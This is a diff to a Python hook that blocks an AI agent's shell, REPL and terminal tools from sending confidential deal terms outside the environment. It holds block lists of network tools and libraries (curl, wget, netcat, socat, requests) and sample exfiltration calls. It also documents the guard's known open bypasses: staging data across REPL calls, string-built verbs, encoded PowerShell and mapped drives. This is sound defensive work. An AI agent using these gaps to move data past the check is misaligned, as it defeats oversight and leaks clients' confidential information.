@@ -16,6 +16,10 @@ confidential-terms.json) from crossing any EXTERNAL egress boundary:
   * egress shell commands             (git push / curl / wget / scp / rsync-remote / Invoke-WebRequest /
                                        gh pr|issue|gist|release|api|repo edit, incl. the files gh
                                        reads a body from -- see GH_EGRESS, 2026-11-08)
+  * network-capable interpreter code  (python -c / node -e / heredocs / REPL input using urllib,
+                                       requests, socket, fetch, axios, .NET clients ... on every
+                                       shell tool; every interact_with_process input -- see
+                                       EGRESS_CODE and REPL ALTITUDE, 2026-11-12)
 
 The deal legitimately exists INSIDE the brain, so INTERNAL reads/writes/commands are
 allowed -- only egress is blocked. This is the whole point: confidentiality is an
@@ -807,7 +811,10 @@ _GH_SUBS = (r"(?:pr|issue|gist|release|api|label|secret|variable|project|discuss
 _GH_HEAD = r"\bgh(?:\.exe)?[\"']?\s+(?:\\\r?\n\s*)?[\"']?"
 EGRESS_BASH = re.compile(
     r"\bgit\s+push\b|\bcurl\b|\bwget\b|\bscp\b|\brsync\b\s+\S+::|"
-    r"invoke-webrequest|invoke-restmethod|\bnetlify\b.*\bdeploy\b|\bwrangler\b.*\b(deploy|publish)\b|"
+    # `netlify ... deploy` / `wrangler ... deploy|publish` pairs moved to deploy_pair() (2026-11-12):
+    # `\bnetlify\b.*\bdeploy\b` is QUADRATIC -- 240 KB of "netlify " took 46-78 s, past the hook
+    # timeout, and a timed-out PreToolUse hook does not block (REFUTE 2026-11-12, C4).
+    r"invoke-webrequest|invoke-restmethod|"
     # PowerShell-native network/mail verbs (REFUTE 2026-11-09: the PowerShell tool and the
     # terminal panel are now egress-gated, and these idioms reached exit 0 before).
     r"\b(?:iwr|irm|curl\.exe|wget\.exe)\b|send-mailmessage|start-bitstransfer|"
@@ -817,6 +824,190 @@ EGRESS_BASH = re.compile(
     + _GH_HEAD + _GH_SUBS + r"\b",  # GitHub CLI (audit finding 2026-11-08)
     re.I,
 )
+
+# --- Interpreter / REPL egress (2026-11-12, stacked on the egress audit PR #452) -----------------
+# WHY HIGH 1 MISSED THIS: HIGH 1 (2026-11-09) routed Desktop Commander start_process /
+# interact_with_process, run_in_terminal and PowerShell here, but classified them with EGRESS_BASH
+# alone -- a list of shell VERBS. Code handed to an interpreter reaches the network through a
+# LIBRARY (urllib, requests, socket, fetch, axios, a .NET client method), never a shell verb, so
+# `interact_with_process(pid, "urllib.request.urlopen('https://x/?q=<term>')")` fell through to
+# "not an egress surface -> allow"; so did `python -c` / `node -e` / heredoc bodies under Bash.
+# EGRESS_CODE names network-capable library / API usage; a shell or interpreter command matching
+# it is an egress surface on every shell tool (its WHOLE text is then term-scanned, like curl).
+# Linear-time by construction: literal alternatives, bounded `{0,32}` import lists whose items are
+# separated by a mandatory comma (one way to split), no nested unbounded quantifiers.
+_DEPLOY_PAIRS = (
+    (re.compile(r"\bnetlify\b", re.I), re.compile(r"\bdeploy\b", re.I)),
+    (re.compile(r"\bwrangler\b", re.I), re.compile(r"\b(?:deploy|publish)\b", re.I)),
+)
+
+
+def deploy_pair(cmd):
+    """Same meaning as the old `\bnetlify\b.*\bdeploy\b` / `\bwrangler\b.*\b(deploy|publish)\b`
+    (both words on ONE line, the second after the first), in linear time: per line, the FIRST
+    head match is the earliest start any pairing could use, so one search after it decides."""
+    for line in cmd.split("\n"):
+        for head, tail in _DEPLOY_PAIRS:
+            m = head.search(line)
+            if m and tail.search(line, m.end()):
+                return True
+    return False
+
+
+_NET_PY_MODULES = (r"socket|socketserver|ssl|smtplib|smtpd|ftplib|poplib|imaplib|telnetlib|"
+                   r"nntplib|requests|httpx|aiohttp|urllib3?|http|httplib2?|xmlrpc|paramiko|"
+                   r"asyncssh|fabric|websockets?|pycurl|ftputil|webbrowser|boto3|botocore|"
+                   r"mechanize|grpc|zmq|exchangelib|O365|win32com|selenium|playwright|pyppeteer|"
+                   # SaaS SDKs that send without a URL literal (ORA's own send surfaces first).
+                   r"hubspot|notion_client|msal|msgraph|office365|anthropic|openai|azure|"
+                   r"google\.cloud|googleapiclient|slack_sdk|twilio|sendgrid|dropbox")
+_NET_JS_MODULES = (r"(?:node:)?(?:https?|http2|net|tls|dgram|dns)|axios|node-fetch|undici|got|"
+                   r"superagent|ws|nodemailer|ssh2|ftp|basic-ftp|request|aws-sdk|googleapis|"
+                   r"openai|@(?:hubspot|notionhq|azure|anthropic-ai|google-cloud|aws-sdk|"
+                   r"microsoft|slack|sendgrid)/[\w.-]+")
+_JSQ = "['\"`]"
+EGRESS_CODE = re.compile(
+    # Any URL scheme literal: code that names an outbound URL is network-capable whatever opens it
+    # (pd.read_csv, os.startfile, `start`, Start-Process, a browser exe, mailto:) -- REFUTE C1.
+    # NOT a namespace URI literal on a narrow host allow-list (openpyxl / lxml / ElementTree over
+    # deal workbooks name them constantly): the host, then a path of [\w./-] only, then a closing
+    # quote, `}` (Clark notation) or `>`. A query, fragment, space, other host or look-alike host
+    # (schemas.microsoft.com.x.example) is still a URL (round-2 coordinator item, 2026-11-12).
+    r"\b(?:https?|ftps?|sftp|wss?|mailto):(?!//(?:schemas\.openxmlformats\.org|"
+    r"schemas\.microsoft\.com|www\.w3\.org|purl\.org/dc)/[\w./-]*['\"}>])|"
+    # Python imports in SYNTAX form only (`import a, socket`; `from http import client`), so prose
+    # such as "rebuilt from requests log" is not code (REFUTE C3).
+    # Each earlier list item may carry an `as` alias (`import pandas as pd, requests as rq`;
+    # REFUTE 2026-11-23, C1a). Still linear: the alias needs the literal `as` between blanks.
+    r"\bimport[ \t]+(?:[\w.]+(?:[ \t]+as[ \t]+\w+)?[ \t]*,[ \t]*){0,32}(?:" + _NET_PY_MODULES
+    + r")\b|"
+    r"\bfrom[ \t]+(?:" + _NET_PY_MODULES + r")(?:\.[\w.]*)?[ \t]+import\b|"
+    r"\burl(?:open|retrieve)\b|\brequests\.(?:get|post|put|patch|delete|head|options|request|"
+    r"session)\b|\bsocket\.(?:socket|create_connection|getaddrinfo|gethostbyname)\b|"
+    r"\bcreate_connection\s*\(|\bopen_connection\s*\(|\.sendmail\s*\(|\.connect\s*\(\s*\(|"
+    r"\bwebbrowser\.open|\b__import__\b|\bimport_module\b|\boutlook\.application\b|"
+    # JavaScript / Node.
+    r"\bfetch\s*\(|\baxios\b|\bXMLHttpRequest\b|\bWebSocket\b|\bsendBeacon\b|\bEventSource\b|"
+    r"\bnodemailer\b|\bundici\b|\b(?:https?|http2)\.(?:request|get|connect)\s*\(|"
+    r"\bnet\.(?:connect|createConnection|Socket)\b|\btls\.connect\b|\bdgram\.createSocket\b|"
+    # The quote may be backslash-escaped: `node -e "require(\"https\")"` (REFUTE 2026-11-23, C1b).
+    r"\b(?:require\s*\(|from|import\s*\(?)\s*\\?" + _JSQ + r"(?:" + _NET_JS_MODULES + r")\\?"
+    + _JSQ + "|"
+    # PowerShell / .NET (EGRESS_BASH already has iwr/irm/WebClient/HttpClient/BITS/Upload*).
+    # Method names cover an object built in an EARLIER call of a persistent terminal / REPL.
+    r"\bdownload(?:string|file|data)(?:async|taskasync)?\b|\bopenread(?:async|taskasync)?\b|"
+    r"\b(?:tcp|udp|smtp)client\b|\bnet\.(?:webrequest|httpwebrequest|ftpwebrequest|sockets|mail|"
+    r"dns)\b|\b(?:http|ftp)?webrequest\]?::create\b|\b(?:get|post|put|patch|send|getstring|"
+    r"getbytearray|getstream)async\s*\(|\bbitsadmin\b|-urlcache\b|\btest-netconnection\b|"
+    r"\bresolve-dnsname\b|\bnslookup\b|\bmsxml2\b|\bwinhttp\b|\bserverxmlhttp\b|"
+    r"-computername\b|-cimsession\b|\benter-pssession\b|"
+    # Other network CLIs and runtimes (cloud copy tools, raw sockets, Perl / Ruby clients).
+    r"\b(?:ncat|netcat|socat|telnet|rclone|azcopy|gsutil|s3cmd)\b|\baws\s+s3\b|"
+    r"\baz\s+storage\b|\bgcloud\s+storage\b|(?<![\w.-])nc(?:\.exe)?[ \t]+(?:-|[\w.-]+[ \t]+\d)|"
+    # `(?<=-M)`: `perl -MLWP::Simple` has no word boundary before the module (REFUTE 2026-11-23).
+    r"(?:\b|(?<=-M))(?:net::(?:http|smtp|ftp)\b|lwp::|io::socket\b|http::tiny\b)|"
+    r"\bopen-uri\b|\bnet/http\b",
+    re.I,
+)
+
+# REPL ALTITUDE DECISION (interact_with_process). Input to a running process is code executed
+# against HIDDEN STATE: `s = requests.Session()` in one call, `s.post(url, json={...})` in the
+# next, and the second call names no library at all. A per-call EGRESS_CODE match therefore cannot
+# be sound for a REPL, so every interact_with_process input is an egress surface. Options weighed:
+#   (a) per-call EGRESS_CODE only (what Bash / start_process / terminal get) -- misses the
+#       hidden-state call above: fail OPEN on the commonest REPL idiom. Rejected.
+#   (b) any term anywhere in REPL input = egress -- blocks ordinary local analysis such as
+#       `pd.read_excel(r'C:\...\<deal folder>\rent roll.xlsx')`. Rejected.
+#   (c) per-pid taint (remember which pids saw network code) -- needs a shared-state writer in a
+#       fail-closed hook, cannot see code loaded by `python -i script.py` or a start_process command
+#       whose pid is unknown at PreToolUse, and fails open whenever the state write fails. Rejected.
+#   (d) CHOSEN: REPL input is always scanned. A term is exempt ONLY when it sits inside a LOCAL
+#       filesystem path literal AND the input carries neither network-capable code (EGRESS_CODE,
+#       which includes any URL scheme) nor a send-shaped call (REPL_SEND_SHAPE: `.post(`,
+#       `.send(`, `params=` ... on an object built earlier). Reading a deal folder by path passes;
+#       a term anywhere else in REPL code -- a payload, a URL, a print, a variable -- blocks.
+# Path literals that are masked: a quoted string starting with a drive letter (any body, spaces
+# allowed: real deal folders have them; but not a drive head followed by whitespace, which is
+# prose), a quoted `./`, `../` or `~/` string with NO whitespace (so './ <deal> LOI signed' is not
+# a path), and an unquoted drive-letter path ending at whitespace. A UNC path (\\host\share)
+# names a REMOTE host -- SMB egress -- and is never masked (pre-commit review 2026-11-12, N5).
+# Everything else is scanned.
+# Accepted friction: REPL code naming a deal outside such a path (a dataframe filter on the deal
+# name, a relative path with spaces, Path(...) / '<deal>' joins) blocks; run it as a script via
+# Bash / start_process instead, where a fresh process has no hidden state and the per-call
+# EGRESS_CODE classification is sound.
+# Send shape (REPL_SEND_SHAPE): payload keywords `params= json= files= headers= auth= data=
+# content= body= form= media_body=` in argument position; methods .post .put .patch .send
+# .send_* .sendall .sendto .sendmail .request .putrequest .endheaders .upload* .urlopen
+# .write_message .emit .publish .invoke .stream .execute .getresponse .getrequeststream; and
+# .write( on a receiver named sock* conn* stream* req* resp* ws wfile writer client* chan*
+# transport pipe*. Accepted friction (fail-safe): `cur.execute(...)` (sqlite), `data=` (pandas)
+# or `body=` in the same input as a deal path block.
+# RESIDUAL -- STAGED ACROSS CALLS (REFUTE rounds 1-2, 2026-11-12): the guard is stateless per call,
+# so a deal path can be bound to a variable in one REPL call (`x = r'C:\...\<deal>\memo.txt'`,
+# masked: a path) and sent in a later call that never names it (`s.post(u, data=x)` -- no term in
+# that call's text), or sent through a method / keyword / receiver name not listed above. What
+# leaves the TEXT of a drive-letter literal -- usually a path, but the masker accepts any body
+# after `C:\x`, so prose can ride inside one (`s.get(u + r'C:\xx\a <deal>')`, `.get(` not being
+# a send shape) -- or, via open(x), file CONTENT (the content-by-reference residual every surface
+# shares). A bare deal NAME outside a drive-letter / relative path literal always blocks.
+# RESIDUAL -- run_in_terminal (pre-commit review 2026-11-12, B2): the terminal panel is a
+# PERSISTENT shell, so a `python` started there is a live REPL whose later lines carry hidden
+# state, exactly like interact_with_process. It is NOT given the always-scan rule, because its
+# ordinary lines are shell work (`rg "<deal>" C:\Deals`) that the rule would block; it keeps the
+# per-call EGRESS_BASH / EGRESS_CODE classification. `s.post(u, data='<deal>')` typed into a REPL
+# running in the terminal panel therefore passes. Use Desktop Commander for interactive REPLs.
+# RESIDUAL -- unquoted drive literal inside a string (REFUTE 2026-11-23, B4): the unquoted
+# drive-letter branch of LOCAL_PATH_LITERAL also matches `C:/<term>` after a space / `=` / `:`
+# INSIDE a quoted string (`s.get(base + '/q?x= C:/<term>')`). Exploitable only with a client from
+# an earlier call and a send method not in REPL_SEND_SHAPE (`.get(`); same class as the drive-
+# literal residual above. Adding `.get(` to REPL_SEND_SHAPE would close it at the cost of
+# blocking every dict/DataFrame `.get(` next to a deal path.
+# RESIDUAL -- mapped network drives (B9): `Z:\<term>\a` is SMB egress but masks like a local path
+# (drive letters cannot be told apart from text); pre-existing parity with every shell surface.
+# RESIDUAL -- keyword classification limits: a scheme-less domain handed to a browser exe,
+# string-built verbs (`'cu' + 'rl'`) and `powershell -enc` payloads are not classified.
+# RESIDUAL -- namespace allow-list (N2): a real fetch whose URL path carries a term on an allow-listed
+# standards host (`pd.read_json('https://www.w3.org/<deal>')`) is exempt from the scheme marker.
+# ACCEPTED FRICTION (fail-safe, N6): any shell line naming a deal AND a URL (a commit message with
+# a link, a heredoc note with a listing URL, a script arg plus a --doc URL, a REPL comment with a
+# URL) or a network module name (`grep -rn "import requests" <deal folder>`) is egress and blocks.
+REPL_SEND_SHAPE = re.compile(
+    r"\.(?:post|put|patch|send|sendall|sendto|sendmail|send_\w+|request|putrequest|endheaders|"
+    r"upload\w*|urlopen|write_message|emit|publish|invoke|stream|execute|getresponse|"
+    r"getrequeststream)\s*\(|"
+    # `.write(` counts only on a receiver NAMED like a socket / stream / request / client object;
+    # `f.write(` / `out.write(` on a local file handle stays local work (round-2 item 2).
+    r"\b(?:sock\w*|conn\w*|stream\w*|req\w*|resp\w*|ws|wfile|writer|client\w*|chan\w*|"
+    r"transport|pipe\w*)\.write\s*\(|"
+    r"[(,]\s*(?:params|json|files|headers|auth|data|content|body|form|media_body)\s*=(?!=)",
+    re.I)
+LOCAL_PATH_LITERAL = re.compile(
+    r"(?<!\w)[rRbBuUfF]{0,2}(?:"
+    r"'[A-Za-z]:[\\/]+(?=[^\s\\/'\"])[^'\r\n]*'|"
+    r"\"[A-Za-z]:[\\/]+(?=[^\s\\/'\"])[^\"\r\n]*\"|"
+    r"'(?:~|\.{1,2})[\\/][^'\s]*'|"
+    r"\"(?:~|\.{1,2})[\\/][^\"\s]*\")|"
+    r"(?<![^\s(,=:])[A-Za-z]:[\\/][^\s'\"]*")
+
+
+def mask_local_paths(text):
+    """`text` with every local filesystem path literal replaced by a space (see REPL ALTITUDE)."""
+    return LOCAL_PATH_LITERAL.sub(" ", text)
+
+
+def url_decoded_view(text):
+    """`text` plus its percent/plus-decoded form (bounded, like web_scan_text). Code builds URLs
+    (`?q=Deal+Name`, `%20`), so shell and interpreter egress is also matched on the decoded text,
+    folded like WEB_TOOLS (separators -> spaces) in main()'s enforce step."""
+    from urllib.parse import unquote_plus
+    decoded = text
+    for _ in range(4):
+        nxt = unquote_plus(decoded)
+        if nxt == decoded:
+            break
+        decoded = nxt
+    return text if decoded == text else text + "\n" + decoded
 
 # --- gh CLI egress (audit finding conf-guard-gh-cli-egress-unscanned, 2026-11-08) ----------------
 # PR / issue / gist / release / discussion bodies, `gh api` fields, repo and label descriptions,
@@ -2061,8 +2252,14 @@ def main():
             # A non-string command used to raise TypeError in EGRESS_BASH.search -> exit 1, which
             # is NON-blocking (review of the 2026-11-08 gh fix).
             block("%s command is not a string; cannot classify it." % tool)
-        if EGRESS_BASH.search(cmd):
-            surface = "egress shell command"
+        # Interpreter code is classified too (2026-11-12): see EGRESS_CODE and REPL ALTITUDE.
+        verb = EGRESS_BASH.search(cmd) or deploy_pair(cmd)
+        code = not verb and EGRESS_CODE.search(cmd)
+        if not verb and not code and _mcp_suffix(tool, ("interact_with_process",)):
+            surface = "interactive process input (REPL)"
+            scan_text = cmd if REPL_SEND_SHAPE.search(cmd) else mask_local_paths(cmd)
+        elif verb or code:
+            surface = "egress shell command" if verb else "network-capable interpreter code"
             scan_text = cmd
             if GH_EGRESS.search(cmd):
                 try:
@@ -2102,8 +2299,10 @@ def main():
     # --- Enforce -----------------------------------------------------------------------
     try:
         hit = find_hit(scan_text, terms)
-        if not hit and (tool in WEB_TOOLS or residual_row(tool)):
-            hit = find_hit(web_folded_text(scan_text), web_folded_terms(terms))
+        # Shell / interpreter egress builds URLs too (2026-11-12): decode, then fold like WEB_TOOLS.
+        if not hit and (tool in WEB_TOOLS or residual_row(tool) or is_shell_tool(tool)):
+            folded = url_decoded_view(scan_text) if is_shell_tool(tool) else scan_text
+            hit = find_hit(web_folded_text(folded), web_folded_terms(terms))
             if hit:  # cite the ORIGINAL term's id, so term_id() over the roster maps it back
                 for key, deal in terms.items():
                     if (not key.startswith("_") and isinstance(deal, dict)
